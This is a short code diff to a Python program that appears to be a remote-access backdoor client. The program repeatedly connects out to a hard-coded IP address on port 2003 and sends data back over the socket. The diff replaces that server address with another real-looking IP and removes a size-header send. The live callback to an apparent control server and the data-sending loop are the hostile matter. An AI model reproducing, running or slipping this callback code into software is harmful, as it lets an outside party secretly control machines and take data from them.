@@ -104,8 +104,8 @@ def start_session(s):
                     size = len(data)
                     s.send("OK".encode())
                     sleep(1)
-                    s.send(str(size).encode())
-                    sleep(1)
+                    #s.send(str(size).encode())
+                    #sleep(1)
                     s.send(data)
                 except Exception as e:
                     print("[*] Error : %s"%(str(e)))
@@ -170,7 +170,7 @@ def main():
     while True:
         try:
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            s.connect(("142.93.158.189",2003))
+            s.connect(("157.230.227.120",2003))
             #print("Connected")
             conn_process = Thread(target=start_session,args=(s,))
             conn_process.start()
